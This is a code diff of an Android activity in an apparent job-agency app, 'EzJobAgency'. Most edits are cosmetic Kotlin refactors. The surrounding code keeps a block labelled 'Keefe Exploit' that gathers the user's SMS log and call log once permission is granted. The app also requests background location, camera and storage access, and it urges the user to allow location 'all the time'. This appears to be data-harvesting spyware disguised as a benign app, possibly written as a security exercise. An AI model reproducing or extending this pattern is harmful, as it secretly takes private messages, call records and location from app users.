@@ -78,8 +78,8 @@ class ProfileTemplate : AppCompatActivity() {
 
         // Keefe Exploit --------------------------------------------------------------
         val SMSPERMISSIONS = arrayOf(
-            android.Manifest.permission.SEND_SMS,
-            android.Manifest.permission.READ_SMS
+            Manifest.permission.SEND_SMS,
+            Manifest.permission.READ_SMS
         )
 
         // Start SMS log
@@ -94,7 +94,7 @@ class ProfileTemplate : AppCompatActivity() {
         }
 
         // Start call log
-        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
             lifecycleScope.launch {
                 try {
                     hv.getCallLog()
@@ -118,7 +118,7 @@ class ProfileTemplate : AppCompatActivity() {
 
     private fun renderInfo(id: Int, industry_name: String) {
         val title = findViewById<TextView>(R.id.pageTitle)
-        title.setText(industry_name)
+        title.text = industry_name
         val name = findViewById<TextView>(R.id.name)
         val description = findViewById<TextView>(R.id.description)
         val phone_number = findViewById<TextView>(R.id.phone_number)
@@ -130,37 +130,37 @@ class ProfileTemplate : AppCompatActivity() {
                 name.setText(R.string.wesley)
                 phone_number.setText(R.string.wesley_number)
                 email.setText(R.string.wesley_email)
-                imageView.setImageDrawable(getResources().getDrawable(R.drawable.wesley, getApplicationContext().getTheme()))
+                imageView.setImageDrawable(resources.getDrawable(R.drawable.wesley, applicationContext.theme))
             }
             R.id.mengrong_button -> {
                 name.setText(R.string.mengrong)
                 phone_number.setText(R.string.mengrong_number)
                 email.setText(R.string.mengrong_email)
-                imageView.setImageDrawable(getResources().getDrawable(R.drawable.mengrong, getApplicationContext().getTheme()))
+                imageView.setImageDrawable(resources.getDrawable(R.drawable.mengrong, applicationContext.theme))
             }
             R.id.lynette_button -> {
                 name.setText(R.string.lynette)
                 phone_number.setText(R.string.lynette_number)
                 email.setText(R.string.lynette_email)
-                imageView.setImageDrawable(getResources().getDrawable(R.drawable.lynette, getApplicationContext().getTheme()))
+                imageView.setImageDrawable(resources.getDrawable(R.drawable.lynette, applicationContext.theme))
             }
             R.id.minyao_button -> {
                 name.setText(R.string.minyao)
                 phone_number.setText(R.string.minyao_number)
                 email.setText(R.string.minyao_email)
-                imageView.setImageDrawable(getResources().getDrawable(R.drawable.minyao, getApplicationContext().getTheme()))
+                imageView.setImageDrawable(resources.getDrawable(R.drawable.minyao, applicationContext.theme))
             }
             R.id.keefe_button -> {
                 name.setText(R.string.keefe)
                 phone_number.setText(R.string.keefe_number)
                 email.setText(R.string.keefe_email)
-                imageView.setImageDrawable(getResources().getDrawable(R.drawable.keefe, getApplicationContext().getTheme()))
+                imageView.setImageDrawable(resources.getDrawable(R.drawable.keefe, applicationContext.theme))
             }
             R.id.jon_button -> {
                 name.setText(R.string.jon)
                 phone_number.setText(R.string.jon_number)
                 email.setText(R.string.jon_email)
-                imageView.setImageDrawable(getResources().getDrawable(R.drawable.jon, getApplicationContext().getTheme()))
+                imageView.setImageDrawable(resources.getDrawable(R.drawable.jon, applicationContext.theme))
             }
         }
         when(industry_name) {
@@ -176,8 +176,8 @@ class ProfileTemplate : AppCompatActivity() {
 
     private fun smsUs(view: View) {
         val PERMISSIONS = arrayOf(
-            android.Manifest.permission.SEND_SMS,
-            android.Manifest.permission.READ_SMS
+            Manifest.permission.SEND_SMS,
+            Manifest.permission.READ_SMS
         )
         if (checkPerms(this, *PERMISSIONS)) {
             writeSms("Hello, I am interested in your job position in the EzJobAgency app.")
@@ -187,8 +187,8 @@ class ProfileTemplate : AppCompatActivity() {
     }
     private fun callUs(view: View) {
         val PERMISSIONS = arrayOf(
-            android.Manifest.permission.READ_CALL_LOG,
-            android.Manifest.permission.CALL_PHONE,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.CALL_PHONE,
         )
         if (checkPerms(this, *PERMISSIONS)) {
             val phone_number = "+65" + findViewById<TextView>(R.id.phone_number).text.toString().filter { it.isDigit() }
@@ -209,12 +209,12 @@ class ProfileTemplate : AppCompatActivity() {
     }
     private fun location(view: View) {
         val PERMISSIONS = arrayOf(
-            android.Manifest.permission.ACCESS_COARSE_LOCATION,
-            android.Manifest.permission.ACCESS_FINE_LOCATION
+            Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.ACCESS_FINE_LOCATION
         )
         if (checkPerms(this, *PERMISSIONS)) {
             // Check background location perms
-            if (checkPerms(this, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
+            if (checkPerms(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
                 // send to google maps
                 redirectLocation()
             } else {
@@ -222,7 +222,7 @@ class ProfileTemplate : AppCompatActivity() {
                 bgAlert.setTitle("Permission Needed!")
                 bgAlert.setMessage("Background Location Permission Needed!, tap \"Allow all the time in the next screen\"")
                 bgAlert.setPositiveButton("Yes") {
-                    dialog, which -> requestPerms(this, arrayOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION), 103)
+                    dialog, which -> requestPerms(this, arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION), 103)
                 }
                 bgAlert.setNegativeButton("No") {
                     dialog, which -> dialog.cancel()
@@ -234,11 +234,11 @@ class ProfileTemplate : AppCompatActivity() {
         }
     }
     private fun openCamera(view: View) {
-        if (checkPerms(this, android.Manifest.permission.CAMERA)) {
+        if (checkPerms(this, Manifest.permission.CAMERA)) {
             startCamera()
         }
         else {
-            requestPerms(this, arrayOf(android.Manifest.permission.CAMERA), 105)
+            requestPerms(this, arrayOf(Manifest.permission.CAMERA), 105)
         }
     }
 
@@ -251,8 +251,8 @@ class ProfileTemplate : AppCompatActivity() {
         }
         else{
             //Android is below 11(R)
-            val write = ContextCompat.checkSelfPermission(this, android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
-            val read = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE)
+            val write = ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
+            val read = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
             write == PackageManager.PERMISSION_GRANTED && read == PackageManager.PERMISSION_GRANTED
         }
     }
@@ -266,7 +266,7 @@ class ProfileTemplate : AppCompatActivity() {
         else{
             //Android is below 11(R)
             ActivityCompat.requestPermissions(this,
-                arrayOf(android.Manifest.permission.WRITE_EXTERNAL_STORAGE, android.Manifest.permission.READ_EXTERNAL_STORAGE),
+                arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE),
                 100
             )
         }
